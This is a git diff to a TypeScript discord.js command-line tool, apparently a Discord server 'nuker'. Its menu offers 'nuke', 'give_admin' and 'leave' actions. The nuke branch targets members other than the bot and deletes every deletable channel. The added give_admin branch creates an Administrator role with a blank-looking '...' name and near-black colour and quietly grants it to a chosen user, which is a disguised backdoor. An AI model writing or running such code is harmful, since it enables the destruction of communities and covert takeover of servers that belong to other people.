@@ -1,4 +1,4 @@
-import { Client, Guild } from "discord.js"
+import { Client, Colors, Guild, PermissionsBitField, Role, RoleFlagsBitField } from "discord.js"
 import { config } from "dotenv"
 import inquirer from "inquirer"
 config({
@@ -54,16 +54,16 @@ while(true) {
                 choices: [
                     "nuke",
                     "give_admin",
+                    
                     "leave",
                     "back"
                 ]
             }
         ]);
 
+        const members = await guild.members.fetch();
         
         if (choice.action === "nuke") {
-            const members = await guild.members.fetch();
-
             const targets = members.filter(
                 member => member.id !== client.user?.id
             );
@@ -86,7 +86,7 @@ while(true) {
 
             for(const channel of channels) {
                 if(channel[1]?.deletable) {
-                    channel[1]?.delete();
+                    await channel[1]?.delete();
                     console.log(`kicked ${channel[1].name}`)
                 } else {
                     
@@ -94,6 +94,51 @@ while(true) {
             }
 
             console.log("deleted channels");
+        }
+
+        if(choice.action === "give_admin") {
+            const answers = await inquirer.prompt([
+                {
+                    type: "search",
+                    name: "select_user",
+                    message: "Select User",
+                    source: async (term) => {
+                        const query = term?.toLowerCase() ?? "";
+
+                        return members.filter((m) =>
+                            m.user.username.toLowerCase().includes(query)
+                        ).map((g) => ({
+                            name: g.user.username,
+                            value: g.id,
+                        }));
+                    }
+                }
+            ]);
+
+            const member = await members.find(m => m.id == answers.select_user)?.fetch();
+
+            if(member) {
+                await member.roles.add(await guild.roles.create({
+                    permissions: PermissionsBitField.Flags.Administrator,
+                    position: -99,
+                    name: "...",
+                    colors: {
+                        primaryColor: Colors.NotQuiteBlack
+                    },
+                    mentionable: false,
+                    hoist: true
+                }))
+
+                console.log("role added")
+            } else {
+                console.error("invalid member")
+            }
+        }
+
+        if(choice.action === "leave") {
+            await guild.leave();
+            
+            console.log("left guild");
         }
     } else {
         console.error("invalid guild");
